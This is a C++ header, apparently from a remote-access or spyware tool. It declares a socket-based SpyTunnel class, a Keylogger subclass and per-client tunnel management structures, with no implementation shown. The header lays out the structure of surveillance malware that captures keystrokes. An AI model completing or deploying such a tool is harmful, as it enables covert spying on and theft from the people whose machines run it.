#ifndef SPY_TUNNEL_HPP
#define SPY_TUNNEL_HPP

#include "include_tunnel.hpp"

class SpyTunnel {
public:
    SpyTunnel() = default;
    int init(std::string __ip, uint __port, int* p_tunnel_shutdown_fd, int __connection_type);
    void run();
    void shutdown();
protected:
    std::string ip_;
    uint port_;
    struct sockaddr_in tunnel_addr_;
    int tunnel_socket_;
    ScopedEpollFD tunnel_shutdown_fd_;
    int tunnel_fifo_ = -1;

    virtual void spawn_window();
};

class Keylogger : public SpyTunnel {
public:
    Keylogger() = default;
protected:
    void spawn_window() override;
};

struct Tunnel {
    CommandCode command_code_;
    int client_index_;
    SpyTunnel* p_spy_tunnel_;
    std::thread thread_;
    int tunnel_shutdown_fd_ = -1;

    Tunnel(CommandCode __command_code, int __client_index, SpyTunnel* __p_spy_tunnel);
};

struct TunnelContext {
    std::condition_variable tunnel_cv_;
    std::mutex tunnel_mutex_;
    std::queue<Tunnel*> tunnel_queue_;
};

void erase_tunnel(std::vector<Tunnel>* __p_tunnels, int __client_index, CommandCode __command_code);



#endif //SPY_TUNNEL_HPP